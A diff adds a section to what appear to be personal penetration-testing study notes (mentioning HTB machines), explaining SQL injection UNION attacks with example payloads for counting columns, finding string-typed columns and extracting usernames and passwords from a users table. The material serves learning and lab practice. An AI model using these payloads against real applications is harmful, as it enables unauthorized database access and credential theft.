@@ -324,3 +324,39 @@ Applied MySQL CLI basics on a real HTB machine. No separate write-up created.
 <img width="1242" height="152" alt="image" src="https://github.com/user-attachments/assets/69f35d54-b54a-4257-b517-27696b4bf880" />
 
 
+
+---
+### Update : 09.07.2026
+
+## UNION attacks
+
+- `UNION` allows to execute one more additional `SELECT`query
+- 2 key requirements must be met so `UNION` works
+  1) Queries must return the same number of columns as the database have
+  2) Data types in each column must be compatible
+
+### How to determine the number of columns:
+```
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+etc.
+```
+-> works because NULL is convertible to every common data type, so its always the right data type
+-> Increase `NULL` as long as there is an error
+
+### How to find columns with useful data type
+```
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+```
+-> Checks every column`s data type. If an error occures, then the relevant column is not suitable for string data
+
+- To retrieve 2 values together in a single column `|| '~' ||` can be used
+  For example:
+  `' UNION SELECT username || '~' || password FROM users--`
+  will output:
+  `admin~iusafhdgbiaus1238asdf`
+  `user1~testpw`
